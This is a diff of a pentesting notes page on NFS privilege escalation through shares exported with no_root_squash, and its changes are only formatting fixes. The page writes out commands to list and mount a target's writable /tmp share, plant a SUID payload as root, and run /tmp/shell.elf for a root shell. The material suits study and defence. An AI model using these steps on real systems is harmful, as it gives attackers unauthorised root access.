@@ -1,6 +1,6 @@
 # NFS
 
-NFS \(Network File System\) is a popular distributed file system.NFS shares are configured in the /etc/exports file. Remote users can mount shares, access, create, modify files. By default, created files inherit the remote user’s id and group id \(as owner and group respectively\), even if they don’t exist on the NFS server.
+NFS (Network File System) is a popular distributed file system.NFS shares are configured in the /etc/exports file. Remote users can mount shares, access, create, modify files. By default, created files inherit the remote user’s id and group id (as owner and group respectively), even if they don’t exist on the NFS server.
 
 
 
@@ -8,7 +8,7 @@ NFS \(Network File System\) is a popular distributed file system.NFS shares are 
 
 Show the NFS server’s export list:
 
-####   `showmount -e [target]`
+#### &#x20; `showmount -e [target]`
 
 Similar Nmap script:
 
@@ -20,7 +20,7 @@ Mount an NFS share:
 
 ## Root Squashing
 
-Root Squashing is how NFS prevents an obvious privilege escalation. If the remote user is \(or claims to be\) root \(uid=0\), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group.While this behavior is default, it can be disabled!
+Root Squashing is how NFS prevents an obvious privilege escalation. If the remote user is (or claims to be) root (uid=0), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group.While this behavior is default, it can be disabled!
 
 ## no\_root\_squash
 
@@ -38,11 +38,11 @@ Check the contents of /etc/exports for shares with the no\_root\_squash option:
 
 Confirm that the NFS share is available for remote mounting:
 
-#### `root@W4LK3R:~# showmount -e 192.168.1.25  Export list for 192.168.56.102:  /tmp *`
+#### `root@W4LK3R:~# showmount -e 192.168.1.25` ` Export list for 192.168.56.102:` ` /tmp *`
 
 Create a mount point on your local machine and mount the /tmp NFS share:
 
-#### `mkdir /tmp/nfs  mount -o rw,vers=2 192.168.1.25:/tmp /tmp/nfs`
+#### `mkdir /tmp/nfs` ` mount -o rw,vers=2 192.168.1.25:/tmp /tmp/nfs`
 
 Using the root user on your local machine, generate a payload and save it to the mounted share:
 
@@ -55,8 +55,6 @@ Make sure the file has the SUID bit set, and is executable by everyone:
 On the target machine, execute the file to get a root shell:
 
 #### `/tmp/shell.elf`
-
-
 
 
 
